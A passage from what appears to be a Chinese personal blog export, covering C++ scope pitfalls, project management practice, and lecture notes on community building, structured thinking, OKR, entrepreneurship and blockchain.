...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do-while作用域的问题"><a href="#do-while作用域的问题" class="headerlink" title="do while作用域的问题"></a>do while作用域的问题</h2><p>do while的大括号是一个作用域，其中定义的变量不能用做while判断</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误用法，a已经被释放</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">bool</span> a = <span class="literal">true</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">while</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//正确用法，使用外部进行判断</span></span><br><span class="line"><span class="keyword">bool</span> b = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">bool</span> a = <span class="literal">true</span>;</span><br><span class="line">    ...</span><br><span class="line">    b = a;</span><br><span class="line">&#125; <span class="keyword">while</span>(b);</span><br></pre></td></tr></table></figure><h2 id="指针引用的作用域问题"><a href="#指针引用的作用域问题" class="headerlink" title="指针引用的作用域问题"></a>指针引用的作用域问题</h2><p>指针或者引用本身作用域可能要比指向的或者引用的变量作用域大，可能出现内存泄漏</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误示例</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Type&gt; pType = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    Type a;</span><br><span class="line">    pType = &amp;a;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="literal">false</span>);</span><br><span class="line">pType-&gt;function();</span><br></pre></td></tr></table></figure><h2 id="C-的switch中的case有多条语句需要加大括号"><a href="#C-的switch中的case有多条语句需要加大括号" class="headerlink" title="C++的switch中的case有多条语句需要加大括号"></a>C++的switch中的case有多条语句需要加大括号</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (state) &#123;</span><br><span class="line">    <span class="keyword">case</span> state1:</span><br><span class="line">        op1();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> state2: &#123;</span><br><span class="line">        op1();</span><br><span class="line">        op2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">        op1();</span><br><span class="line">        op2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>项目管理笔记</title>
    <url>/2018/07/02/2018-07-02-project-manager/</url>
    <content><![CDATA[<h1 id="团队凝聚力"><a href="#团队凝聚力" class="headerlink" title="团队凝聚力"></a>团队凝聚力</h1><table><thead><tr><th></th><th>学生团队</th><th>公司团队</th></tr></thead><tbody><tr><td>凝聚力源头</td><td>无</td><td>工资绩效</td></tr><tr><td>影响</td><td>无</td><td>收入</td></tr></tbody></table><h2 id="学生团队"><a href="#学生团队" class="headerlink" title="学生团队"></a>学生团队</h2><ul><li>一人犯错集体受罚</li><li>迟到可以连带受罚<ul><li>把握好度，不生成怨恨</li></ul></li></ul><h2 id="团建"><a href="#团建" class="headerlink" title="团建"></a>团建</h2><ul><li>去唱K</li><li>吃饭</li><li>一起出去玩</li><li>适当放假</li></ul><h1 id="项目开发过程"><a href="#项目开发过程" class="headerlink" title="项目开发过程"></a>项目开发过程</h1><h2 id="人员和职责"><a href="#人员和职责" class="headerlink" title="人员和职责"></a>人员和职责</h2><ul><li>项目经理<ul><li>负责项目进度把控</li><li>人员和资源协调</li><li>组织站会</li><li>问题决策</li><li>外部对接</li></ul></li><li>敏捷教练(敏捷开发项目需要)<ul><li>监督和指导敏捷项目各项流程</li><li>敏捷培训</li></ul></li><li>PO团队<ul><li>团队只有一个声音给出需求定义</li><li>关心用户体验给出界面交互设计方案</li></ul></li><li>研发CTO<ul><li>协助项目经理做事</li><li>负责版本合入并做代码质量把控和代码走读审查</li><li>对版本各方原理熟悉，指导各个研发人员</li></ul></li><li>测试CTO<ul><li>负责版本的测试人员测试用例评审</li><li>负责各项环境搭建和资源调度</li></ul></li><li>架构师<ul><li>根据界面交互设计代码语言、工具、环境</li><li>设计代码流程和实现方案</li><li>具体问题跟研发人员共同协商解决方案</li><li>研发过程实时跟进研发人员的方案是否符合预期</li><li><strong>问题到架构师为止，保证一定有解决方案</strong></li></ul></li><li>安全专员<ul><li>提供安全相关指导</li></ul></li><li>安全测试专员<ul><li>提供安全渗透测试用例</li><li>发布后出了漏洞的背锅人</li></ul></li></ul><h2 id="进度管理"><a href="#进度管理" class="headerlink" title="进度管理"></a>进度管理</h2><h3 id="进度预估"><a href="#进度预估" class="headerlink" title="进度预估"></a>进度预估</h3><ul><li>工具：<code>WBS</code></li><li>尽可能细分模块<ul><li>预估时间，单位：<code>人天</code></li><li>预估好每个人的工作量是否平均</li><li>预估每个人的工作效率以及工作质量</li></ul></li><li>风险把控<ul><li>每天检查进度，通过进度和计划预估风险</li><li>风险提出并想出相应方案解决</li><li><strong><font color="red">不要相信成员在时间内能完成，一定要跟进</font></strong></li></ul></li></ul><h3 id="里程碑"><a href="#里程碑" class="headerlink" title="里程碑"></a>里程碑</h3><ul><li>适当制定里程碑，具有时间节点<ul><li>要完成功能</li><li>可完成功能</li><li>暂时不需要完成的功能</li></ul></li><li>将项目划分为若干个里程碑</li><li>做好每个里程碑完不成的方案</li></ul><h3 id="效率保证"><a href="#效率保证" class="headerlink" title="效率保证"></a>效率保证</h3><ul><li>写大概10%的时候找负责人讲思路，防止思路不正确重写</li><li>晨会<ul><li>昨天做了什么</li><li>今天要做什么</li><li>有什么问题需要协调</li><li>自己模块百分比<ul><li>跟踪进度</li></ul></li></ul></li><li>目标导向<ul><li>每天目标</li><li>每周目标</li><li>每个阶段目标</li></ul></li><li>白板贴纸<ul><li>to do</li><li>doing</li><li>done</li></ul></li><li>bug跟踪记录<ul><li>提一个bug<ul><li>问题描述</li><li>问题复现步骤</li><li>问题现象</li><li>期望现象</li><li>问题环境</li><li>问题时间</li></ul></li><li>解决一个bug<ul><li>问题定位过程</li><li>问题原因描述</li><li>改动原理概述</li><li>可能影响模块</li><li>额外复现步骤</li><li>可验证的版本号</li></ul></li><li>bug列表整理到项目管理工具中</li></ul></li></ul><h2 id="总结收获"><a href="#总结收获" class="headerlink" title="总结收获"></a>总结收获</h2><ul><li>周会进行总结<ul><li>本周计划完成情况</li><li>总体进度完成情况</li><li>下周计划</li><li>个人总结<ul><li>做得好的</li><li>做的不好的</li><li>对团队有什么建议和措施</li></ul></li></ul></li><li>项目结题总结报告<ol><li>代码审查报告</li><li>代码扫描报告</li><li>系统测试报告</li><li>覆盖率报告</li><li>单元测试报告</li><li>验收过程记录</li><li>测试验收报告</li><li>设计及方案文档</li><li>代码及代码说明文档</li><li>使用手册及注意事项</li><li>培训资料及培训记录</li><li>结项报告</li></ol></li></ul><h2 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h2><ul><li>外部输入需要考虑大小问题，是否可能越界</li><li>外部输入是否可能存在特殊字符</li><li>sql注入</li><li>xml注入</li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>git管理工具：<code>gitlab</code></li><li>代码扫描工具：<code>infer</code>、<code>clov</code></li><li>外网穿透：<code>sunny</code></li></ul>]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>点石创校第八次课程笔记--社群管理</title>
    <url>/2018/05/03/2018-05-03-shequnguanli/</url>
    <content><![CDATA[<h1 id="给你一个社群你会怎么管"><a href="#给你一个社群你会怎么管" class="headerlink" title="给你一个社群你会怎么管"></a>给你一个<strong>社群</strong>你会怎么管</h1><p>主讲人:秋叶大叔</p><h2 id="你的企业要不要搞社群？"><a href="#你的企业要不要搞社群？" class="headerlink" title="你的企业要不要搞社群？"></a>你的企业要不要搞社群？</h2><p>超级用户 = 超级热爱 + 自带流量</p><ul><li>可以当大喇叭</li><li>热爱但没流量–帮打造微ip</li><li>有流量不热爱–带打造特长</li></ul><h3 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h3><ul><li>如何打破互联网巨头的流量垄断？</li><li>如何应对越来越贵的流量？</li><li>如何解决垃圾流量的干扰？</li></ul><h3 id="解局"><a href="#解局" class="headerlink" title="解局"></a>解局</h3><ul><li>10%的超级用户带来70%的增长</li><li>超级用户会持续购买你的商品</li><li>超级用户会义务替你宣传和推广</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul><li>keep：寻找健身达人做社群助教</li><li>毛衣到毛线</li></ul><h3 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h3><ul><li>控</li><li>发烧</li><li>DIY</li></ul><h2 id="你的行业有超级名师吗？"><a href="#你的行业有超级名师吗？" class="headerlink" title="你的行业有超级名师吗？"></a>你的行业有超级名师吗？</h2><p>超级名师 = 品牌课程 + 热门平台</p><ul><li>卡值精准标签</li><li>卡值热门平台</li></ul><h3 id="过去"><a href="#过去" class="headerlink" title="过去"></a>过去</h3><ul><li>教育行业从来都是打造名师</li><li>超级名师成为企业的代言人</li><li>靠出书演讲吸引更多人报名</li></ul><h3 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h3><ul><li>知识付费推广行业越来越多</li><li>超级名师的舞台 = 线上 + 线下</li><li>裂变 + 分销，用知识做导流</li></ul><h2 id="你的身边有超级圈子吗？"><a href="#你的身边有超级圈子吗？" class="headerlink" title="你的身边有超级圈子吗？"></a>你的身边有超级圈子吗？</h2><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><ul><li>最早的社群往往是关系网</li><li>不同能量的人加入不同圈子</li><li>借助圈子社交空间打开可能</li></ul><h3 id="生态"><a href="#生态" class="headerlink" title="生态"></a>生态</h3><ul><li>越是高价值的人越重视关系经营</li><li>从经营关系到经营生态</li><li>从经营生态到共同成长和抵抗风险</li></ul><h3 id="三个关键词帮你发现超级圈子"><a href="#三个关键词帮你发现超级圈子" class="headerlink" title="三个关键词帮你发现超级圈子"></a>三个关键词帮你发现超级圈子</h3><ul><li>共同话题</li><li>地理接近</li><li>运营给力</li></ul><p>宝妈–超级圈子</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>会员营销</td><td>如果你有很多很多用户，要管起来</td></tr><tr><td>活动营销</td><td>如果你有很多潜在用户，要做线上线下活动促销</td></tr><tr><td>客户关系管理</td><td>如果你有很多高端客户，要做服务</td></tr><tr><td>公关运营</td><td>如果你有很多高端人脉，需要运营</td></tr><tr><td>社群运营</td><td>如果你的产品有用户狂热喜爱，需要连接</td></tr></tbody></table><p>不要用流量管理社群<br>社群的价值在社群之外</p><ul><li>一个社群不是比规模</li><li>而是比资源调度能量</li></ul><p>2018，社群元年<br>从<strong>流量思维</strong>到<strong>运营思维</strong></p><h3 id="三种商业化社群运营模式"><a href="#三种商业化社群运营模式" class="headerlink" title="三种商业化社群运营模式"></a>三种商业化社群运营模式</h3><ul><li>整合模式<ul><li>以产品为中心</li><li>整合超级用户</li><li>挖掘<strong>策划</strong>人才</li><li>开发CRM系统</li></ul></li><li>链接模式<ul><li>以个人为中心</li><li>打造超级名师</li><li>培养<strong>链接</strong>人才</li><li>启动粉丝运营</li></ul></li><li>运营模式<ul><li>以关系为中心</li><li>加入超级圈子</li><li>打造<strong>服务</strong>团队</li><li>进行人脉交换</li></ul></li></ul><h4 id="整合模式适合冷启动"><a href="#整合模式适合冷启动" class="headerlink" title="整合模式适合冷启动"></a>整合模式适合冷启动</h4><p>找到能成为超级用户1000个铁杆粉丝</p><h4 id="链接模式适合小而美"><a href="#链接模式适合小而美" class="headerlink" title="链接模式适合小而美"></a>链接模式适合小而美</h4><p>找对同频的人，做一件美好的事情</p><h4 id="运营模式适合规模化"><a href="#运营模式适合规模化" class="headerlink" title="运营模式适合规模化"></a>运营模式适合规模化</h4><p>给你10000个社群，你靠什么管？</p><h3 id="三种社群运营模式"><a href="#三种社群运营模式" class="headerlink" title="三种社群运营模式"></a>三种社群运营模式</h3><ul><li>自建社群–慢运营模式</li><li>打入社群–快启动模式</li><li>包养社群–有钱人模式</li></ul><h3 id="好社群要有门槛"><a href="#好社群要有门槛" class="headerlink" title="好社群要有门槛"></a>好社群要有门槛</h3><h4 id="邀约入群的4种门槛"><a href="#邀约入群的4种门槛" class="headerlink" title="邀约入群的4种门槛"></a>邀约入群的4种门槛</h4><ul><li>邀约入群</li><li>申请入群</li><li>任务入群</li><li>付费入群</li></ul><h4 id="好社群要开始就让群员多元化"><a href="#好社群要开始就让群员多元化" class="headerlink" title="好社群要开始就让群员多元化"></a>好社群要开始就让群员多元化</h4><h4 id="好的社群人员结构是怎样的？"><a href="#好的社群人员结构是怎样的？" class="headerlink" title="好的社群人员结构是怎样的？"></a>好的社群人员结构是怎样的？</h4><ul><li>灵魂人物：要有灵魂人物，而且灵魂人物大家都认可</li><li>多元势能：如大咖占5%、中咖占20%、普通人占75%</li><li>多种个性：“老司机”戏弄新加入的“小清新”</li><li>多种标签：总有意想不到的牛人冒出来解决你的问题</li></ul><h3 id="好社群的特征"><a href="#好社群的特征" class="headerlink" title="好社群的特征"></a>好社群的特征</h3><ul><li>好名字自带流量</li><li>好社群吸引大咖</li><li>好活动传播口碑</li></ul><h2 id="如何管理好社群？"><a href="#如何管理好社群？" class="headerlink" title="如何管理好社群？"></a>如何管理好社群？</h2><p>退群测试</p><h3 id="蒸发效应"><a href="#蒸发效应" class="headerlink" title="蒸发效应"></a>蒸发效应</h3><p>社群中只有一位大牛，单方面向普通人分享，时间长了，大牛认为得到的价值不大，离开了，大牛一走，普通人认为自己的问题得不到解决，也就跟着走了，渐渐群就没活力死掉了</p><h3 id="咖啡馆效应"><a href="#咖啡馆效应" class="headerlink" title="咖啡馆效应"></a>咖啡馆效应</h3><p>国外的艺术家特别喜欢泡咖啡馆，各种人在一起交流讨论分享头脑中的闪光点，最后都受益匪浅舍不得离开这样的文化氛围，一个社群有这样的效应，大家在社群里畅所欲言，又有共同遵守的规范</p><h3 id="好的社群第一个特征就是创造链接"><a href="#好的社群第一个特征就是创造链接" class="headerlink" title="好的社群第一个特征就是创造链接"></a>好的社群第一个特征就是创造链接</h3><p>如果没有总在身边看到他的熟悉感就不会有真的社群</p><p>弱关系创造链接，强关系创造合作<br>能创造出强关系的社群才是好社群</p><p>先创造链接<br>再培养信任</p><h4 id="如何创造信任"><a href="#如何创造信任" class="headerlink" title="如何创造信任"></a>如何创造信任</h4><ul><li>群分享</li><li>群金句</li><li>群答疑</li><li>线下聚会</li><li>线下交流</li><li>线下活动</li><li>合作活动</li><li>合作写稿</li><li>合作公益</li></ul><p>坚持–产生仪式感<br>话题–带来新鲜感<br>组合–引来潜水党</p><p>好的社群产生情感认同<br>能忍受社群灌水、刷屏<br>只因为你对这个社群产生情感认同</p><p>好的社群让群员有回报<br>坏的社群让群员有xx</p><h4 id="创造社群认同的三个维度"><a href="#创造社群认同的三个维度" class="headerlink" title="创造社群认同的三个维度"></a>创造社群认同的三个维度</h4><ul><li>以产品为纽带 | 好玩，产品有足够复杂</li><li>以情感为纽带 | 好暖，有趣有料有意思的人多</li><li>以利益为纽带 | 好赚，激励多，福利多，机会多</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>结构思考力</title>
    <url>/2018/04/15/2018-04-15-jiegousikaoli/</url>
    <content><![CDATA[<p>思考更清晰、表达更有力</p><p>丹宁 - 一片丹心 宁静致远</p><ul><li>生涯规划师</li><li>心理咨询师</li><li>培训师</li></ul><hr><ul><li>[理解] - 隐形思维显性化<ul><li>[识别] - 信息中事实及观点</li><li>[判断] - 事实观点对应关系</li><li>[概括] - 简洁概括所有内容</li></ul></li><li>[重构] - 显性思维结构化<ul><li>[论] - 结论先行</li><li>[证] - 以上统下</li><li>[类] - 归类分组</li><li>[比] - 逻辑递归</li></ul></li><li>[呈现] - 结构思维形象化<ul><li>[配] - 配关系</li><li>[得] - 得图示</li><li>[上] - 上包装</li></ul></li></ul><hr><h1 id="模块一-透过结构看思考"><a href="#模块一-透过结构看思考" class="headerlink" title="模块一 透过结构看思考"></a>模块一 透过结构看思考</h1><ul><li>我是谁、从哪来、到哪去？</li><li>有粘性的记忆力是有结构的</li><li>事实只有一个，但是看问题获得信息不一样</li><li>很多时候通过经验来获得答案，而且可以被一个答案禁锢住</li><li>《金字塔原理》</li><li>有思路想是否全面清晰</li></ul><p>三层次模型<br>输入 -&gt; 理解、重构、呈现 -&gt; 输出</p><p>万能公式：</p><blockquote><p>在<strong><strong>的基础上，从</strong></strong>、<strong><strong>、</strong></strong>等方面，讲述了____。</p></blockquote><p>事实观点</p><p>用做商务沟通</p><p>7+-2<br>5+-2</p><h2 id="MECE原则"><a href="#MECE原则" class="headerlink" title="MECE原则"></a>MECE原则</h2><table><thead><tr><th align="center">MC</th><th align="center">CE</th></tr></thead><tbody><tr><td align="center">相互独立</td><td align="center">完全穷尽</td></tr></tbody></table><p>戴戒指<br>清热解毒（情侣、热恋、结婚、孤独）</p><h1 id="模块二-透过结构看表达"><a href="#模块二-透过结构看表达" class="headerlink" title="模块二 透过结构看表达"></a>模块二 透过结构看表达</h1><h1 id="模块三-透过结构看问题"><a href="#模块三-透过结构看问题" class="headerlink" title="模块三 透过结构看问题"></a>模块三 透过结构看问题</h1><h1 id="模块四-透过结构看共识"><a href="#模块四-透过结构看共识" class="headerlink" title="模块四 透过结构看共识"></a>模块四 透过结构看共识</h1>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>OKR介绍</title>
    <url>/2018/04/15/2018-04-15-okr/</url>
    <content><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><ul><li>如何管理人</li><li>如何管理牛人</li></ul><h1 id="next"><a href="#next" class="headerlink" title="next"></a>next</h1><table><thead><tr><th align="center"></th><th align="center">传统：指令管理</th><th align="center">当今：目标管理</th></tr></thead><tbody><tr><td align="center">历史背景</td><td align="center">劳动力密集型</td><td align="center">知识密集型</td></tr><tr><td align="center">思想内核</td><td align="center">衡量</td><td align="center">激励</td></tr><tr><td align="center">推动力</td><td align="center">自上向下</td><td align="center">自下而上</td></tr><tr><td align="center">工具</td><td align="center">KPI（关键绩效指标）</td><td align="center">OKR（目标与关键成果法</td></tr><tr><td align="center">使用背景</td><td align="center">工厂<br>大公司的底层部门</td><td align="center">创业公司<br>大公司的核心层</td></tr></tbody></table><h2 id="制定-OKR会议"><a href="#制定-OKR会议" class="headerlink" title="制定 - OKR会议"></a>制定 - OKR会议</h2><p>OKR三原则</p><ul><li>平等协商</li><li>极度透明</li><li>求同存异</li></ul><h2 id="执行-实施过程"><a href="#执行-实施过程" class="headerlink" title="执行 - 实施过程"></a>执行 - 实施过程</h2><h2 id="复盘-打分总结"><a href="#复盘-打分总结" class="headerlink" title="复盘 - 打分总结"></a>复盘 - 打分总结</h2><h1 id="next2"><a href="#next2" class="headerlink" title="next2"></a>next2</h1><h2 id="实践-KR设定"><a href="#实践-KR设定" class="headerlink" title="实践 - KR设定"></a>实践 - KR设定</h2><p>初创团队容易目标太多</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>简单随笔</title>
    <url>/2018/04/08/2018-04-08-ideas/</url>
    <content><![CDATA[<ul><li>如果养老让老人什么都不干是让他们变得更老，以我自己的想法老人的经验或许是一种财富</li><li>讲课可能是把自己没有注意到的道理讲出来，其实自己知道这些东西。老师通过讲述已知却未重视的道理，用达成共识来讲授知识。</li><li>好的讲课应该是讲出都不懂而且特别感兴趣的讲出来</li><li>辩论可以让方案更加完善，但是消耗时间较长</li><li>ap扫mac地址确认位置</li><li>摄像头采集人脸</li><li>火车站先拿数据，大数据分析</li></ul>]]></content>
      <categories>
        <category>Essay</category>
      </categories>
  </entry>
  <entry>
    <title>创业领导力--龚阿玲</title>
    <url>/2018/04/08/2018-04-08-chuangyeleading/</url>
    <content><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><ol><li>对你而言，什么是创业？请举3个不同领域的例子</li><li>你打算创业吗？为什么？创业最让你感到兴奋的是什么？</li><li>你不想创业吗？为什么？创业最让你感到害怕的是什么？</li><li>你最熟悉的创业成功者是谁？你认为成功的秘密是什么？</li><li>你最熟悉的创业失败者是谁？你认为失败的原因是什么？</li><li>小时候你最想成为谁？现在你想成为谁？</li><li>你认为创业前需要做哪些准备？需要多少钱？还必须具备哪些条件？</li><li>你认为创业成功的标志是什么？</li><li>你认为创业需要找怎样的合伙人？你更看重情商还是智商？</li><li>如果创业成功，你将获得什么最宝贵的东西？之后想去做什么？</li><li>如果创业失败，你将失去什么最宝贵的东西？之后想去做什么？</li></ol><ul><li>学习是做减法<ul><li>现在信息很多</li><li>学习做减法，筛选信息</li><li>时间有限</li><li>商业活动抢时间最成功</li><li>选择需要的东西，对不需要的说no</li></ul></li><li>找到根源问题，或许很简单</li><li>翻译最好是理解后自己写出来</li><li>投资人的钱不能随便拿</li><li>有机会要思考</li><li>失败80-90%因为合伙人的问题</li><li>失败的例子更有用，成功的可能有关键因素不会讲出来<ul><li>比尔盖茨家庭才让他可以玩电脑</li></ul></li></ul><h1 id="next"><a href="#next" class="headerlink" title="next"></a>next</h1><ul><li>创业创意更重要，而不是技术</li><li>点子不是最重要的，将点子证明出来更重要<ul><li>你想出的点子，有100个人已经在做了</li></ul></li><li>做出来才是最重要的，想法不重要</li></ul><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>把自己变得更好，才能吸引更好的人</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>比特币、区块链、代币经济系统--李远师兄分享</title>
    <url>/2018/04/07/2018-04-07-qukuailian/</url>
    <content><![CDATA[<p>Dian 228 李远 SelfSell创始人<br><a href="mailto:Liyuan@selfsell.com">Liyuan@selfsell.com</a></p><h1 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h1><ul><li>定义：种点对点的电子支付系统</li><li>隐匿 法外 暴涨</li><li>10000000倍</li><li>心跳</li><li>暴涨暴跌</li></ul><h1 id="大事记"><a href="#大事记" class="headerlink" title="大事记"></a>大事记</h1><ul><li>2008.10 论文发表</li><li>2009.01 开始挖矿</li><li>2010.05 买披萨</li><li>2013.11 历史最高点</li><li>2014.02 重大灾难，比特币丢失</li><li>2016.01 央行开始研究自己的货币</li><li>2017.02 开始暴涨</li><li>2017.09.04</li><li>2017.12 最高峰</li></ul><h1 id="产业格局"><a href="#产业格局" class="headerlink" title="产业格局"></a>产业格局</h1><ul><li>mining: CPU、GPU、FPGA、ASIC 速度逐渐加快</li><li>Exchange: Mt.Gox、Bitfinex、Binance</li><li>Coins or ICO: LTC、ETH、Ripple、EOS、SSC</li><li>BlockChain: DIgital Assets、SmartContract、DAPP</li></ul><h1 id="比特币-1"><a href="#比特币-1" class="headerlink" title="比特币"></a>比特币</h1><ul><li>平权运动的技术号角</li><li>真理？泡沫？骗局？</li><li>买币: 参与，才能感知浪潮的脉动</li></ul><h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><ul><li>定义: 基于共识协议和加密算法的去中心化分布式账本系统</li><li>防篡改 透明 去中心</li><li>分布式 <strong>可信</strong> 全共识</li><li>脱媒: 去掉中介<ul><li>节点到节点</li></ul></li><li>发言加编号来统计人数–区块链</li></ul><table><thead><tr><th>微信组局</th><th>在区块链里的概念</th></tr></thead><tbody><tr><td>接龙发帖</td><td>链式数据结构</td></tr><tr><td>规则：每个人发帖 = 上一个帖子内容 + 下一个编号 + 自己名字</td><td>共识机制，根据严格的规则和公开的协议形成</td></tr><tr><td>规则定下来后，大家自发登记</td><td>去中心化，没有任何单一用户能够掌控它</td></tr><tr><td>在微信里记录登记情况</td><td>点对点对等网络</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li>储存技术</li><li>加密算法</li><li>P2P技术</li><li>共识算法</li></ul><h2 id="公私钥对"><a href="#公私钥对" class="headerlink" title="公私钥对"></a>公私钥对</h2><h2 id="共识协议"><a href="#共识协议" class="headerlink" title="共识协议"></a>共识协议</h2><table><thead><tr><th>POW(Proof of Work)</th><th>POS(Proof of Stake)</th><th>DPOS(Delegate Proof of Stake)</th></tr></thead><tbody><tr><td>比腕力</td><td>拼财富</td><td>攒人品</td></tr></tbody></table><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><h2 id="变革的意义"><a href="#变革的意义" class="headerlink" title="变革的意义"></a>变革的意义</h2><h2 id="地球村"><a href="#地球村" class="headerlink" title="地球村"></a>地球村</h2><ul><li>由于范围变大使得人们相互认识减少，形成欺诈等</li><li>实现地球村</li></ul><h2 id="代币经济系统"><a href="#代币经济系统" class="headerlink" title="代币经济系统"></a>代币经济系统</h2><ul><li>以代币为中心的<strong>新/旧</strong>经济模型+</li></ul><table><thead><tr><th>ICO</th><th>IEO</th><th>IFO</th></tr></thead><tbody><tr><td>空投</td><td>流通</td><td>IMO</td></tr></tbody></table><ul><li>Bitcoin 特殊的代币系统 当成资产</li><li>Ethreum 去中心的应用开发平台 成为了一个发币平台</li><li>Achain 底层链 帮项目做支持工作</li><li>SelfSell 投资个人未来价值的平台</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>火柴人成长之路</title>
    <url>/2018/04/07/2018-04-07-dianshichuangxiao-note/</url>
    <content><![CDATA[<p>讲课老师: 唐德华顾问<br>华中科技大学 经济管理工程系<br>营销</p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><ol><li>艺术和制图</li><li>有道理，不一定有真理</li><li>火柴人随便，没有细节，不能抗压</li><li>玄学</li><li>工程师：用工具数据解决问题</li><li>情景模拟</li><li>组织，团队意识，高效</li><li>问和说</li><li>统计学</li><li>华科学会如何考试，如何看书</li><li>说写的艺术</li></ol><h2 id="问"><a href="#问" class="headerlink" title="问"></a>问</h2><ol><li>简单明了</li><li>为什么要问</li><li>要得到什么消息</li></ol><h2 id="说-（自我介绍）"><a href="#说-（自我介绍）" class="headerlink" title="说 （自我介绍）"></a>说 （自我介绍）</h2><ol><li>记住名字</li><li>对象，以听众为主</li><li>结构</li><li>关键词，故事</li></ol><h2 id="说写的艺术"><a href="#说写的艺术" class="headerlink" title="说写的艺术"></a>说写的艺术</h2><h3 id="说"><a href="#说" class="headerlink" title="说"></a>说</h3><ol><li>别说不懂得东西</li></ol><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><ol><li>标题</li><li>规律和经验</li><li>调味品</li></ol><h1 id="自我审视"><a href="#自我审视" class="headerlink" title="自我审视"></a>自我审视</h1><p>抓住机会</p><h2 id="“火柴人意识”常见问题"><a href="#“火柴人意识”常见问题" class="headerlink" title="“火柴人意识”常见问题"></a>“火柴人意识”常见问题</h2><ol><li>自以为是<ul><li>腾讯被投资因为，把自己的产品印在所有的名片上（QQ号）</li></ul></li><li>不靠谱<ul><li>抓住机会</li></ul></li><li>自我管理（四象法 5S管理）<ul><li>时间</li><li>四象法，紧急+重要</li></ul></li><li>成本意识（找对象游戏）</li><li>风险评估（从种树谈起）</li><li>解决问题（变议论为行为）<ul><li>行动就有机会</li><li>不要说太多万一</li></ul></li></ol><h2 id="“人情世故”俗话说。。。。。。"><a href="#“人情世故”俗话说。。。。。。" class="headerlink" title="“人情世故”俗话说。。。。。。"></a>“人情世故”俗话说。。。。。。</h2><ol><li>做事做人</li><li>学会吃小亏<ul><li>不要太精明</li></ul></li><li>感恩寻找生命中的贵人<ul><li>学会说好话</li></ul></li></ol><p>三个工具：微笑，“Excuse me, thank you!”，伸出手！<br>两句话：相互吹捧 自我批评</p><h2 id="成本"><a href="#成本" class="headerlink" title="成本"></a>成本</h2><ul><li>物质成本</li><li>时间成本</li><li>机会成本</li><li>风险成本</li></ul><h2 id="什么人能走的更远？情怀？梦想？"><a href="#什么人能走的更远？情怀？梦想？" class="headerlink" title="什么人能走的更远？情怀？梦想？"></a>什么人能走的更远？情怀？梦想？</h2><ul><li>价值观和使命感</li><li>大海可渡的坚持</li><li>坚持为他人解决问题</li></ul><h2 id="总结：靠谱-自立"><a href="#总结：靠谱-自立" class="headerlink" title="总结：靠谱 自立"></a>总结：靠谱 自立</h2><ul><li>事事有找落</li><li>有效率</li><li>身先士卒 感染他人</li><li>到前线去指挥他人</li><li>花自己赚的钱</li></ul><h1 id="入门武功之ABC"><a href="#入门武功之ABC" class="headerlink" title="入门武功之ABC"></a>入门武功之ABC</h1><h2 id="干中学"><a href="#干中学" class="headerlink" title="干中学"></a>干中学</h2><ul><li>技多不压身</li><li>看一遍不如做一遍</li><li>好电影都是下一部</li></ul><h2 id="团队力量"><a href="#团队力量" class="headerlink" title="团队力量"></a>团队力量</h2><p>协作 